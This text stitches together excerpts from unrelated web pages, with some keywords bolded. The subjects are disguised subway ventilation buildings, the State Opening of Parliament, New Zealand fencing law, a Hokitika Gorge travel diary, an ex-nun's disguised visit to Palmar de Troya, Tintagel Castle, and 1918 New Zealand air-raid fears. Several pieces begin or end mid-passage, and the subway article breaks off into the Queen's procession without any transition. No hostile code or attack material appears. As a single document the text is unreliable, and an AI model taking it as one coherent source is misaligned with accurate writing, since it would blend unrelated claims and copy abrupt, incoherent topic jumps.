introduced me to this underground world of hidden subway ventilation shafts disguised by false building facades, with doors from which people occasionally exit, but never seem to enter. Some of these subterranean secrets are in use, while others have been abandoned like Cincinnati&#x2019;s own subway stations beneath Central Parkway.</p>   <p>What&#x2019;s fascinating is the effort made to disguise these facilities, to blend them in with the neighboring buildings. While it seems a logically aesthetic means of&#xa0;making the utilitarian more appealing, some have argued that the cities in which these structures are located are trying to hide a deep secret. For comparison, consider the Cincinnati subway &#x2013; when the subway and Central Parkway were first being constructed, the ventilation chimneys and the entrances to the below-ground stations were nicely appointed with decorative stonework.</p>   <div>    <p>Ventilation shaft, looking north along Parkway from Liberty St., July 2, 1928</p>   </div>   <div>    <p>Close up of decorative stonework for ventilator railing, Central Parkway,Nov. 19, 1928</p>   </div>   <div>    <p>East entrance to underpass near Brighton Bridge, Central Parkway,Nov. 15, 1928</p>   </div>   <p>Today, metal doors in the sidewalks along Liberty Street and Central Parkway, and steel doors and grates enclosing the tunnel openings along I-75 near the Hopple Street Viaduct, are all that remain visible of the subway to give passers-by cause for speculation as to what lies beneath or behind these doors.</p>   <div>    <p>Source: Google Search (  </div>   <p>But in New York, London, and Paris, clever preservation commissions and city transit leaders have provided a more pleasant disguise, leaving local residents completely unaware of what was behind the closed doors of 58 Joralemon Street in Brooklyn, 23 and 24 Leinster Terrace in Bayswater, London, or 145, Rue La Fayette in Paris. Personally I would rather see a well maintained Greek Revival or Edwardian building fa&#xe7;ade than an empty space in the middle of a historic streetscape with a large metal grate from which hot air is expelled. So I invite you to read along, view the images, and decide for yourselves!</p>   <p>&#xa0;The article in <i>The</i> <i>New York Times</i> describes a Greek Revival townhouse nestled in the midst of a row of brownstones located on a quiet street in Brooklyn, NY. The townhouse at #58 Joralemon Street is well maintained despite the darkened windows through which no light ever shines. A peek through the crack in the front door reveals no one is home. In fact, it reveals this is not a home at all, but a large empty space with a concrete floor and&#x201c;catwalks going back and forth this way and that, and somewhere down below the trains going by&#x201d;, as quoted in the article by an area resident who was fortunate to be given a peek inside the &#x201c;Shaft House&#x201d;, the name by which those living in the neighborhood refer to the townhouse.</p>   <div>    <p>Source: Matt Green, Flickr (  </div>   <p>The Shaft House is actually an emergency exit and ventilation fan plant for subway tracks 4 and 5 of the Interurban Rapid Transit Company and is maintained by New York City Transit. The townhouse was purchased by the city in 1908 to house the ventilation fans. Large steel louvered shutters, from which hot air and smoke would randomly pour out into the street, were fitted into the window cases. Behind the pleasant Greek Revival fa&#xe7;ade, the interior decorating consists of electrical panels, switches and behind a steel door, catwalks that cross over a nine-story drop to the subway tracks below.</p>   <div>    <p>Source: Heather Quinlan, Flickr,   </div>   <div>    <p>Source: Allison Meier, Flickr (  </div>   <p>The restoration of the 1847 fa&#xe7;ade to its historical appointments is owed to the Landmarks Preservation Commission and a local community association. Both entities made recommendations to the city, who owns the property, to spruce up the aging fa&#xe7;ade which included the removal of the unsightly steel ventilation shutters. &#x201c;Windows&#x201d; were installed made of sheets of Lexan &#x2013; a hard plastic resin that is used for such things as sports helmets and windshields &#x2013; on which wooden mullions were placed to create panes. New ventilation shafts were installed to expel the air out through the&#xa0;roof. In addition to being more pleasant to look at, New York City Transit considers the quaint fa&#xe7;ade to be a security benefit,&#xa0;since the building now blends seamlessly in with the row of brownstones &#x2013; a useful disguise in our post-9/11 world for what could be a potential target to those wishing to inflict harm on the city.

Here, she will put on the Imperial State Crown and Robe of State, as well as the Collar of the Order of the Garter. &#xa0;Upon her arrival, gun salutes are fired in Hyde Park and at the Tower of London.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p>Finally, the doors open and the Queen emerges from the Robing Room, with a fanfare announcing her procession. She is now wearing the Imperial State Crown and her Robe of State, which is carried by four Pages of Honour. In addition, she is wearing the collar of the Order of the Garter, the most senior order of chivalry in the United Kingdom. The procession is led by the Officers of Arms and Heralds, then the Great Officers of State. The Queen, accompanied by the Duke of Edinburgh, is attended by four Pages of Honour who carry her train. Behind her are the Prince of Wales and Duchess of Cornwall, followed by the ladies-in-waiting and other members of the Royal Household. The procession goes the length of the Royal Gallery and through the Prince&#x2019;s Chamber, into the House of Lords.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p>Upon arrival in the House of Lords, the Queen takes her seat on the throne, while her Pages of Honour arrange her Robe of State. At this point, she says &#x2018;My Lords, pray be seated&#x2019; and the entire chamber take their seats. The Duke of Edinburgh is seated immediately to her left, on a throne which is just slightly smaller than hers. The Prince of Wales and Duchess of Cornwall are seated in smaller chairs to the Queen&#x2019;s left. The Pages of Honour stand to the side of the Prince and Duchess, while the Queen&#x2019;s ladies-in-waiting stand on the opposite side of the dais.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p><span>Royal Summons to the Commons</span> The signal is given to instruct The Gentleman Usher of the Black Rod to summon the members of the House of Commons. He proceeds through the central lobby, and upon arrival at the doors of the Commons, the door is slammed. This symbolizes the House of Commons&#x2019; independence from the Sovereign.</p>   <p>Black Rod bangs on the door three times, before it is opened for him. He proceeds into the Commons, acknowledging the members, and says &#x2018;Mr. Speaker&#x2026;Her Majesty The Queen commands this honourable house attends Her Majesty, immediately, in the House of Peers.&#x2019;</p>   <p>The members of the House of Commons then proceed to the House of Commons, led by Black Rod and the Speaker. They take their place, standing, at the bar at the far end of the House of Lords. At this point, the Lord Chancellor approaches the throne, and hands the Speech to The Queen. The speech, although called The Queen&#x2019;s Speech, is actually written by the government of the day, and lists the Government&#x2019;s plans for the current session of Parliament.</p>   <p>After The Queen has read the speech, she processes back out of the House of Lords, through the Prince&#x2019;s Chamber and Royal Gallery, and back into the Robing Room. Once she has removed the Imperial State Crown and Robe of State, she and the Duke of Edinburgh descend the Norman Staircase and return to their carriage for the procession back to Buckingham Palace.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

   <div>   <h3>Fences and Walls</h3>   <p> Love them or hate them, fencing and boundary walls are an integral feature of your garden. They offer a number of practical solutions for your property, as well as enhancing your home and neighbourhood. However, before building one, I would recommend you consider the following questions. These will help you to define the function of the fence, so you can then choose the type and style of fence, which will fit those requirements.</p>   <p><strong>Why do I need a fence?</strong> Privacy? Security? To keep pets and children safe? Define your boundaries Reduce traffic noise? Create spaces within the garden? To shelter me from the wind? To keep my pool area safe?</p>   <p>There are also a number of important legal issues to consider, especially if you are building a fence that you share with a neighbour or if you live in an area with a residential zone that has specific fencing rules.</p>   <p>Fencing is covered by the fencing Act 1978 and the Fencing Amendment Act 1979. For a full copy of these acts go to .</p>   <p>Key points to be aware of: Section 9. Occupiers of adjoining land must share the cost and work on a dividing fence. Section 10. You can compel your neighbour to contribute to the cost of a shared fence. Section 11. Allows you to object to an order compelling you to contribute to the cost of a joint fence. Section 14. This covers how long you have to do the work on a fence after being ordered to do it. Section 18. Persons taking advantage of a fence. This covers a person benefiting from a fence they didn&#x2019;t contribute to. They can be charged interest of 10% per year on half the value of the fence at the time of serving a notice. Section 21. Give and take fence. When occupiers cannot agree on a fence line, the court can decide using a give and take principle. Section 22. Where the fence is to be built. The middle of the fence must be put on the boundary line, or as near as practicable. Section 26. About the rights of persons (and their equipment) constructing the fence to go on to the adjoining land. Please note: It is important to read each section of the act to get the full explanation</p>   <p><strong>Fence design</strong> When choosing the style of fence, it is important to compliment the architecture of house, the surrounding landscape and neighbourhood. Consider matching materials that are used in your home exterior. You are not just limited to traditional materials like timber. Take a look around and you will see a huge variation of fences using materials such as corrugated <b>iron</b>, natural stone and rock, brick, glass, coloursteel, concrete and lightweight alloys. </p>   <p>You will also need to consider your budget. There is a significant difference in cost between a timber paling fence and a concrete block wall. If you are on a budget, then a basic timber paling fence painted or left in its natural state and softened with shrubs or climbers is a good solution. Ask a professional landscape designer or architect for their ideas. And get a couple of quotes from reputable landscape contractors or builders before getting started. </p>   <p><strong>Privacy</strong> If its privacy you require, then solid materials such as timber boards, brick, stone, concrete, and corrugated <b>iron</b> would work well. In most cases you can build a fence or wall to 1.8m high on the boundary. Anything higher will require a resource consent. You can achieve varying degrees of privacy by using timber in a louver-style or an open slat style or trellis to create a sense of openness. Wrought <b>iron</b> is strong, enduring material that fits in with a number of looks. You can also create a living fence and windbreak using plants. They provide all the benefits of a built fence, with the additional advantage of flowers, foliage and scent. There are a number of shrubs and trees both native and exotic that grow superbly in a number of situations, such as;</p>   <p>Griselina littoralis Camellia spp. Pittosporum spp. Photina &#x2018; Red robin&#x2019; Corokia spp. Eugenia ventenatii Podocarpus totora </p>   <p><strong>Security</strong> If security is important to you and your family, then once again opt for a high solid fence. This may give you the feeling of security, however, sometimes it may have the opposite effect. Imagine how much easier it is for intruders to target a house that is not visible from the street or properties nearby. Trellis, wrought <b>iron</b> or glass inserts can provide views in and out of the property, while living areas still remain private. Apparently, having a place that is open, instead of fenced in, is less likely to be broken into, thereby minimizing burglaries. Also, having a high fence around your property can block out valuable light and create shady areas within your garden.</p>   <p><strong>Safety for pets and children</strong> Pets and children need to be kept save on your property. A fence that is solid and well constructed provides an effective solution. The height of the fence is important. Children can easily scale a low fence and dogs can leap over and quickly escape. A solid fence ensures little dogs can&#x2019;t squeeze through the gaps. <b>Gates</b> will need to be also installed across the driveway and in openings around the property.</p>   <p><strong>Defining boundaries</strong> As properties get smaller and in-fill housing becomes more commonplace, boundaries are firmly declared with fences or walls. Issues with privacy from neighbours have become a common problem for homeowners. Fencing alone does not solve this problem. Clever and intelligent planting can offer some additional privacy as well has softening the harsh lines between homes.</p>   <p><strong>Reduce traffic noise</strong> A wall can help to reduce the noise of traffic if you live near a busy road. The wall must be solid with no penetrations in order to be effective. Any penetration, opening or gate can lessen the effectiveness of the barriers. Concrete walls are preferred but you can use other materials.</p>   <p><strong>Spaces within the garden</strong> Fences or screens give you the opportunity to create and define within your property They give protection from the weather to provide . Microclimates can be created for potages or cold sensitive planting themes.</p>   <p><strong>Protection from the wind</strong> High walls or fencing can also act as a buffer from prevailing winds but they do not completely block them out. The wind simply hits the solid fence with full force, surges over and causes worse turbulence on the lee side. However, a slatted screen or spaces left in a wall or fence, allows the air currents to pass through it, reducing its force.</p>   <p><strong>Pool fencing </strong> If you own a pool or spa you are required under the Fencing of Swimming Pools Act 1987 and Building Act 2004 to erect a 1.2m high fence to completely enclose the pool or spa area. There are a number of other regulations that you must adhere to prevent children entering a pool area unsupervised. Some council&#x2019;s have additional, differing requirements. I would highly recommend you arm yourself with all the information about pool fencing before you start a landscape project of this scale. There are a range of fencing materials available including glass, wrought <b>iron</b> and stainless steel. The design and finish depends on what you want to achieve. </p>   <p>Sandra Batley is an <b>Auckland</b> based landscape designer.</p>   <p>Sandra Batley Dip LD FLOURISH</p>  </div>

   <article>   <header>    <h1>Hokitika Gorge &#x2013; December 9</h1>   </header>   <section>    <aside>     <p>August 24, 2014</p>    </aside>    <p>We decided against our original plan to visit Franz Josef Glacier. Instead, we headed straight for Hokitika Gorge. Once you get to the town of Hokitika, you turn east and zig and zag your way around the farms for about 35 minutes. Fortunately, the route is well marked.</p>    <p>Once at the carpark, it&#x2019;s only about a 10 minute walk to the gorge. The color of the water is this unique milky turquoise from the glacial runoff.&#xa0;&#xa0; Our photos are not retouched!</p>    <p>&#xa0;</p>    <p>We crossed the bridge to the other side and wandered around a bit on the rocks.</p>    <p>Instead of driving back to Hokitika, we continued on the backroads to Lake Kaniere. There were several geocaches placed along its shores, which was one of its draws. The first one looked like it would be an easy walk a bit off the road. Wrong! It was about 2km up and down some steep hills, and ended at a platform overlooking the lake. We never saw another person the entire time.</p>    <p>The next geocache took us to Dorothy Falls. There was another couple there so we didn&#x2019;t attempt looking for a cache and only took a quick photo. Across from the trailhead to the falls is another trail to the lakeshore. A geocache was located there as well. There was a family with a dog at the edge of the lake and Fred talked to them, while I went into the bush and found the cache. The never suspected a thing.</p>    <p>&#xa0;</p>    <p>&#xa0;</p>    <p>We still had plenty of time so headed up to Arahura Cesspool. We had read about a swingbridge at the Arahura Styx River track and tried to get to it. We found the <b>iron</b> gate and traveled to the washout. Then we attempted to travel on foot for the last 2km to the bridge. We had to cross the stream and through a cow paddock, then cross the stream again and head up a hill. The track was in bad shape and progressively got muddier and muddier. My shoes were soaked. When we came to about the 7th mud puddle that required bushwacking around, we threw in the towel. I was disappointed we couldn&#x2019;t get to the swingbridge, it was made entirely of cable from what pictures showed of it. Too bad the track was so bad.</p>    <p>We headed for our campground located halfway along SH73 to Arthur&#x2019;s Pass. Jackson&#x2019;s Retreat had fabulous views across the valley viewing Lake Brunner Road and the owner was very welcoming. There were two other campervans there besides us. The toilet and shower block was top notch. It was a good end to a long day.</p>   </section>  </article>  
   <div>   <p>We hired a car in Seville, set the GPS to English, and quickly headed out of the city and along the main highway towards Utrera. It was Sunday afternoon, 17 January 2016, the sky cloudy.</p>   <div>    <p>The Basilica of Palmar de Troya</p>   </div>   <p>I was playing with the movie camera, nerves quietly scrambled, watching groves of olive trees slip past, reminiscing about another time. And, reminiscing about what seems like another life, when I was a Carmelite of the Holy Face of Jesus &#x2013; dressed in a long brown habit, face covered by a black veil &#x2013; silenced, hidden, invisible. In the distance, Basilica&#xa0;spires suddenly speared an overcast sky. We were nearly there, nearly at Palmar de Troya.</p>   <div>    <p>A street in the Village of Palmar de Troya</p>   </div>   <p>We veered off the highway towards the village, and parked. The streets were quiet, except for a blaring radio, a lone dog, and a few workmen. Locals eyed us with suspicion as we wandered around, filming. It was a chance to speak a bit of Spanish and improve my accent.</p>   <p>A couple of hours later, after coffee and cake in a simple caf&#xe9; where the owners was still cleaning after a late Saturday night&#x2019;s revelry, we walked up the path to the Basilica&#xa0;compound.</p>   <div>    <p>I felt so small &#x2013; outside the <b>gates</b> of the compound</p>   </div>   <p>The sun was breaking through, heightening colour and contrast. There was no-one in sight, just huge concrete walls, five metres high, quietly screaming fortress &#x2013; not church. The walls looked impenetrable, un-scalable, with entry via heavy <b>iron</b> <b>gates</b>, always guarded, always closed and bolted&#xa0;&#x2013; exactly as I remembered it from my time there, twenty-five years ago.</p>   <p>&#xa0;</p>   <div>    <p>The wall with barbed-wire</p>   </div>   <p>The walls had been extended at the rear of the compound to allow farm animals to graze. We tried to peer over the walls as the land undulated but, as soon as we got a little closer, guard dogs barked noisily, raising alarm, although no-one appeared. Rolls of barbed wire attached to the walls, in one section, indicated even more determination to intimidate anyone contemplating mischief.</p>   <p>Self-sufficiency, in the form of dozens of solar panels and a wind farm, suggest a new direction of sustainability for the Order of the Carmelites of the Holy Face of Jesus; at least, since our last visit in 2007.</p>   <p>The following afternoon, back at the hotel, Nicholas and I dressed correctly according to the Palmarian dress code, hoping to gain entry into the compound. Nicholas wore long trousers (jeans are forbidden), a long sleeved shirt buttoned at the neck, a woollen jumper and jacket, socks and shoes.</p>   <div>    <p>Wearing my disguise</p>   </div>   <p>I wore a long skirt, well below the knee, with a long sleeved jumper and coat, buttoned at the neck &#x2013; plus a wig and black lace mantilla. Since I am an ex-nun of the Palmarian Church, and left the Order in 1990 having taken final vows, I am excommunicated and, therefore, not welcome there; hence, a wig as disguise.</p>   <p>We left the hotel, caught a bus, arrived at the train station and hired a car &#x2013; once again. Rush-hour traffic slowed our journey through the city centre as the winter&#x2019;s sun was pulled over the horizon. We continued our journey in the dark, obeying GPS prompts, minds firmly focused on our mission. By the time we arrived at the Basilica&#xa0;of Palmar de Troya, it was 7:00 pm and pitch black. We parked at the front entrance and waited. A few vehicles came and went as we discussed our plan. Half an hour later, we knocked on the <b>iron</b> <b>gates</b>. A security guard opened the door, interrogated us and checked our clothing.</p>   <div>    <p>I asked if we could come in: &#x201c;Podemos entrar?&#x201d;</p>   </div>   <p>We stepped inside. Automatic lights switched on as we walked up the path bordered by Phoenix palm trees. The grand doors of the Basilica&#xa0;opened and three cardinals came outside and headed towards us. &#x201c;Where are you from? Who are you?&#x201d; The security guard had obviously phoned someone and three cardinals had been sent to check on us. The questions were spoken in Spanish by the Vicar General, and translated into English by one of the other cardinals.&#xa0;I turned away, fearing the close encounter, and sure recognition, as I pulled my mantilla over the side of my face.</p>   <p>&#x201c;Why are you here? Who do you know? Where did you get the scapulars?&#x201d;&#xa0;We explained that I had made them. &#x201c;They are out-of-date but quite well made,&#x201d; the English cardinal said, somewhat amused, as he asked permission to inspect them.&#xa0;Nicholas obliged, turning it over so the cardinal could look at the reverse. &#x201c;Tell me! What are your names?&#x201d; A little black book appeared. They wrote down our names which were fake. Then: &#x201c;Take the scapulars off, right now. Only Palmarians are allowed to wear the Holy Face scapular. Take them off, now.&#x201d; The Vicar General was annoyed.&#xa0;We obeyed. &#x201c;You&#x2019;re not allowed to receive the sacraments.&#x201d;&#xa0;We tried to appease them.&#xa0;All the questions were directed at Nicholas. I was, after all, a mere woman and definitely second class, in their opinion.</p>   <div>    <p>The Basilica of Palmar de Troya ablaze with lights</p>   </div>   <p>&#x201c;Are you filming?&#x201d; More annoyance. &#x201c;Yes.&#x201d; &#x201c;Stop filming. No cameras.&#x201d;&#xa0;We obeyed. &#x201c;Journalists write false things about us.&#x201d; &#x201c;Why is that?&#x201d; Nicholas asked. &#x201c;They don&#x2019;t understand us.&#x201d;&#xa0;Further discussion followed. &#x201c;How many believers are there worldwide?&#x201d; Nicholas asked. They wouldn&#x2019;t answer that question. But they did say that they have brought everyone from Australia there, which suggested that there weren&#x2019;t many Australian Palmarians. &#x201c;Your group is very small, isn&#x2019;t it?&#x201d; Nicholas continued. Once again, they wouldn&#x2019;t comment. However,&#xa0;their conversation indicated that they knew the name of every believer, worldwide, suggesting that the total number of believers is very small, indeed. Finally: &#x201c;You may enter the church for Benediction and the procession, followed by the Stations of the Cross. The Stations are quite long, about one and a half hours. But you may enter and observe. That is alright.&#x201d; &#x201c;Thank you,&#x201d; we said. &#x201c;We are the true Church, you know.&#x201d; And, with that, they turned and walked back to the Basilica.</p>   <p>As Nicholas and I gazed at the imposing walls around the compound, the <b>iron</b> <b>gates</b> opened to let a vehicle through. &#x201c;Let&#x2019;s get out of here,&#x201d; Nicholas said. He didn&#x2019;t like being locked in. He felt trapped. &#x201c;If we can&#x2019;t film, there&#x2019;s no point in going into the Basilica.&#x201d; I wasn&#x2019;t keen to put my disguise to the test, once again, by trying to enter the Basilica. I&#x2019;d been lucky &#x2013; I hadn&#x2019;t been recognised by the cardinals because they didn&#x2019;t know me. They must have joined the Order sometime in the last twenty-five years, since my departure, but I couldn&#x2019;t be sure my disguise would hold up, once inside.</p>   <p>So, with hearts beating wildly, we walked towards the open <b>gates</b>, each step a symbol of our rejection of the Palmarian Church, its fanatical religious leaders and rigid thinking, its excessive rules, its limited view of life and women.</p>  </div>

The castles outerward can be seen in the distance.    </figcaption>   </figure>   <p>For hundreds of years the site of Tintagel Castle has fascinated visitors and locals alike. &#xa0;Even without knowing any of its past the place oozes with untold stories and imaginations can run riot (which they have).</p>   <p><strong>The Fiction</strong></p>   <p>Ask almost anyone about Tintagel Castle and immediately King Arthur will come to the fore. &#xa0;It was Geoffrey of Monmouth who wrote the&#xa0;<em>History of the Kings of Britain&#xa0;</em>sometime between the 1135 and 1138 who associated Tintagel with King Arthur as the place where Arthur&#x2019;s father Uther Pendragon seduced/tricked Igerna into bedding him (Merlin and magic appear to be involved&#x2026;) and so Tintagel became known as the place where King Arthur was conceived. &#xa0;It should be noted that at no time did Geoffrey of Monmouth ever suggest that Tintagel was Arthur&#x2019;s home or that the castle belonged to him. &#xa0;The only connection was and is the his story of conception.</p>   <p><em>&#x201c;The History nowhere claims that Arthur was born at Tintagel, or that he ever visited the place later in life, or that in any sense the stronghold became his property when he was King&#x2026;On so slight a foundation, almost every subsequent writer was able to expand the conception of Arthur at Tintagel to his birth there and, by implication, ownership and even residency.&#x201d; &#xa0;(</em>Thomas C. 1993)</p>   <p>Whilst it is understandable, after all this part of Cornwall with its dramatic coastline rather lends itself to stories of magic, romance, skulduggery and drama. &#xa0;It seems a shame that the Arthur connections &#x2013; real or imaginary &#x2013; detract from the true story of the headland and its castle.</p>   <p><b>The Facts</b></p>   <p>The remains the visitor sees today can be divided roughly into two phases of occupation, post-Roman and after 1100AD.</p>   <p>The occupation of the headland in the post-Roman era was originally believed to have represented the remains of early Celtic monastery. &#xa0;This theory has now been rejected and instead it is believed that the site is that of a &#x201c;&#x2026;high status secular settlement probably used by the Kings of Dumnonia between the Roman withdrawal in 410AD until the end of the seventh century AD, and it has now been identified as the Durocornouis (fortress of the Cornish)&#x2026;&#x201d; (Weatherhill C. 2009).</p>   <figure>    <figcaption>     Site C &#x2013; the low dry stone walls of Post Roman buildings.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>The buildings which are associated with this phase can be found clustered around the later medieval chapel, below on the cliff edge (just above the <b>iron</b> gate) and further along the headland. &#xa0;Many of the buildings were revealed after a scrub fire on the headland. &#xa0;Excavations have produced vast quantities of Mediterranean pottery such as amphorae dating to the fifth and sixth centuries. &#xa0;The amount of imported pottery exceeds the amounts found on all other known post-Roman sites in Britain.</p>   <p>An often overlooked feature of the headland is the indentation known as Arthur&#x2019;s footprint. &#xa0;It is an eroded hollow in the rock on the highest point of the headland and shaped roughly like a footprint. &#xa0;Its association with Arthur is irrelevant as it is more likely an indication of ceremonies enacted here during the post-Roman period if not earlier.</p>   <p>In parts of Ireland and Scotland there are places which &#xa0;also have footprint type impression in rock and are associated with inauguration ceremonies of important people well into medieval times. &#xa0;Symbolically, placing a foot in a specific place is representative of a persons right to rule over the surrounding territory. &#xa0;Is it not possible that this example here at Tintagel was something similar and equally ancient.</p>   <p><em>&#x201c;It can be wondered. therefore, if the occasions when the Dumnonian ruler and his court &#x2013; or any other major chieftain in the post-roman south-west &#x2013; came to Tintagel included public recognition of a king as replacing his dead predecessor, and whether this rock-marking figured in ceremonies.&#x201d; (</em>Thomas C 1993).</p>   <p>Perhaps the importance of Tintagel during this period cannot be over emphasised enough.</p>   <figure>    <figcaption>     Site B &#x2013; the low walls in the foreground are Post Roman. The inner and outer ward of the 12th century are visible in the distance.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>The second phase of settlement belongs in the twelfth century and is the result of building works done under the auspices of Richard the Earl of Cornwall. &#xa0;Richard was made Earl of Cornwall in 1227 and in 1233 bought Bossiney and Tintagel from Gervase de Hornicote although it does seem that building works had already begun by this time.</p>   <p>Much of the impressive remains the visitor sees today are the ruins of Richards castle. &#xa0;The inner ward is on the island and the outer ward is on the main land side. &#xa0;Originally there appears to have been a bridge between the two as by this time the land bridge had all but eroded away.</p>   <figure>    <figcaption>     The remains of the great hall in the inner ward.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>One question does need to be asked at this point &#x2013; why did the Earl of Cornwall build a substantial castle here in Tintagel? &#xa0;It is far from the centers of Cornish commerce and it is no where near the main routes into and out of Cornwall. &#xa0;It defends nothing but open water. &#xa0;In short it has no military value or function and is that not what castles are for? &#xa0;So then, why Tintagel?</p>   <p>Richard was the second son of King John and by all accounts was an ambitious and educated man who had decided to make a statement. &#xa0;He would have read Geoffry of Monmouth&#x2019;s&#xa0;<em>History</em> and would have been told about Tintagel being the ancient seat of the rulers of Dumnonia. &#xa0;His decision to build a flashy castle here was his way of saying to the Cornish people and others &#x2013; &#x201c;Here I am, your Earl &#x2013; from this ancient seat of power I will rule&#x201d;.</p>   <figure>    <figcaption>     An interpretation board depicting what the hall would have looked like in the time of Earl Richard.    </figcaption>   </figure>   <p>&#xa0;</p>   <p><strong>Final Facts</strong></p>   <ul>    <li>The headland has two freshwater wells.</li>    <li>The Chapel is dedicated to St Juliot and is 12th century in date but seems to have earlier origins.</li>    <li>The tunnel is an enigma, dug into the stone bedrock of the island with small <b>iron</b> tools, it is most likely medieval in date and it has been suggested it was a cool store for foodstuffs such as meat.</li>    <li>Merlin&#x2019;s Cave is a great place to explore at low tide but is unlikely to have anything to do with the Merlin of Arthurian myth.</li>    <li>The beach below the headland is known as the Haven.</li>   </ul>   <blockquote>    <p>In the end, it is fair to say the story of Tintagel Castle is not complete. &#xa0;I, as much as the next person have a great affection of the Arthurian stories and if such stories provide impetus for the average person to visit Tintagel then all the better. &#xa0;But personally the facts are the clincher &#x2013; it is they which make the better story.</p>   </blockquote>   <p><strong>Sources</strong></p>   <p>Thomas C. 1993&#xa0;<em>Tintagel &#x2013; Arthur and Archaeology &#xa0;</em>English Heritage/Batsford.</p>   <p>Weatherhill C. 2009&#xa0;<em>Cornovia Ancient sites of Cornwall and Scilly 4000BC &#x2013; 1000AD.&#xa0;</em>Halsgrove.</p>   <figure>    <figcaption>     Merlins Cave.    </figcaption>   </figure>   <figure>    <figcaption>     The feature known as the tunnel.    </figcaption>   </figure>   <figure>    <figcaption>     The inner wall of the tunnel showing the cut marks made by     <b>iron</b> tools.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     The remains of the 12th century chapel to St Juliot.    </figcaption>   </figure>   <figure>    <figcaption>     View of the outer ward from the island.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     The rear wall of the great hall.    </figcaption>   </figure>   <figure>    <figcaption>     Remains of the inner ward &#x2013; ancillary buildings to the great hall.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     A stormy sea in the Haven.    </figcaption>   </figure>   <p>&#xa0;</p>   <figure>    <figcaption>     Sheep have been reintroduced to keep vegetation from taking over the island.    </figcaption>   </figure>   <figure>    <figcaption>     The post medieval doorway framing a view of Glebe Point.    </figcaption>   </figure>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>  </div>  
   <div>   <p>For a country so far from the frontline, there was a surprising amount of discussion in the New Zealand press in the autumn of 1918 about the possibility of <b>Auckland</b> being bombed or Wellington being shelled. It's true that it was often framed in a joking fashion, as with the above cartoon which appeared in the <em>New Zealand Observer</em> on 4 May with the caption 'IF A BOMB FELL ON ONE OF OURS?' showing the reactions of an amusingly confused congregation as the war intrudes into their Sunday devotions. But despite the humour, there's an undercurrent of fear, and also perhaps, strangely, of desire. So, according to the <em>Observer</em>'s 'They Say' column on 30 March, one of the things they were saying was</p>   <blockquote>    <p>That is is possible that a raider will visit New Zealand, let loose an air plane, and drop bombs on <b>Auckland</b> City. If one should drop on ? Good-bye New Zealand.</p>   </blockquote>   <p>Laidlaw Leeds was a big <b>Auckland</b> department store (now better known as Farmers); obviously it's an exaggeration to suggest that blowing it up would be an irretrievable disaster for the country as a whole. It's just part of the sarcastic and cynical style of the columnist. A few days later, a similar column in the <em>New Zealand Free Lance</em> (quite possibly inspired by the <em>Observer</em>, its sister paper) suggested that 'town talk' had it</p>   <blockquote>    <p>That if a Hun air-raider should visit this fair Dominion and drop bombs on some of our 'indispensables' it would be 'Good-bye, New Zealand.'</p>   </blockquote>   <p>The 'indispensables' here would be men deemed too essential for the war effort to be conscripted. What's significant about these jokes is that the idea of German raiders launching aeroplanes to bomb New Zealand cities had some currency, otherwise there would be no point to them. Another 'They Say' comment in the <em>Observer</em> a couple of weeks later made the connection to the mystery aeroplanes scare explicitly:</p>   <blockquote>    <p>Thousands of New Zealanders have seen hostile aircraft in New Zealand air lately. It is sincerely hoped they will not drop bombs on any 'indispensables,' or even on Appeal Boards.</p>   </blockquote>   <p>How far this claim of 'Thousands of New Zealanders' seeing mystery aeroplanes can be trusted is unclear. Again, the jocular tone of the column means it can't be taken at face value, as another relevant entry from the same issue shows:</p>   <blockquote>    <p>Owing to the reported presence in New Zealand of hostile skycraft hairdressers are secretly planning punitive hair raids.</p>   </blockquote>   <p>Presumably, hairdressers were doing no such thing! But it seems likely that, at the very least, 'Thousands' can be read as indicating that many more mystery aeroplane sightings took place than were otherwise reported in the press.</p>   <p>It wasn't just about aeroplanes, however. Recall the who was worried about bombs dropped from seaplanes as well as:</p>   <blockquote>    <p>[...] these big guns firing 100 miles. What's to stop a raider coming in behind Rangitoto with one of these guns and firing a shell into our houses in Grafton Road?</p>   </blockquote>   <p>This is a clear reference to the , a German supergun which fired over three hundred 9-inch shells at Paris from a distance of 120 km, beginning with the opening of the on 21 March. Unlike (which also raided the city during this period), the Paris Gun gave no warning: the shells could land anywhere at anytime. They killed 256 civilians in total, 88 alone when a shell hit the church of on Good Friday -- an incident prominently reported in the New Zealand press. This deadly, surprising, and above all long-range attack on Parisian churchgoers seems to have struck a nerve on the far side of the world, and was conflated with the concurrent fears of a attack on New Zealand by a raider. For example, the caption of the cartoon at the top of this post actually read in full:</p>   <blockquote>    <p>IF A BOMB FELL ON ONE OF OURS?</p>    <p>Parson (reading war news). So a shell from the Hun long-distance gun fell onto a church and killed and wounded hundreds of people? 'Um, safer here.</p>   </blockquote>   <p>There are several things going on here. One is a commentary on the lack of churchgoing in New Zealand, as yet another 'They Say' item from 30 March makes clear:</p>   <blockquote>    <p>The remarkable thing about the German shelling of Paris is that when the shells hit churches they invariably injure someone. Now if a shell were to fall on a New Zealand church ---</p>   </blockquote>   <p>Another is the obvious one, the simple act of imagining New Zealand under fire. And I think that yet another is the confusion of the congregation, who are surprised and don't know how to interpret the explosion: 'Did you speak?', 'Sit down Billy!', 'Good day'. That is to say, that New Zealanders, so remote and safe from the fighting, don't know what war really is. </p>   <p>This is where desire comes in. Early on in the mystery aeroplane scare, the <em>Observer</em> published a letter from a wounded New Zealand soldier who had been in London during an air raid. He suggested that</p>   <blockquote>    <p>Except for the unfortunate few who are killed, I think it is a good thing there is a raid now and again. It lets some of these headed [sic] 'peace at any price people' in the House of Commons see that there is really a war on, and it would do both Australia and New Zealand a lot of good, too, to get either a good raid or a bombardment on to some of their main cities. It might shake some of those blighters up who are hanging back, and probably -- having had a taste of what the gentle Hun is really capable of doing -- they would perhaps have a little more real fellow-feeling for the maimed and wounded who 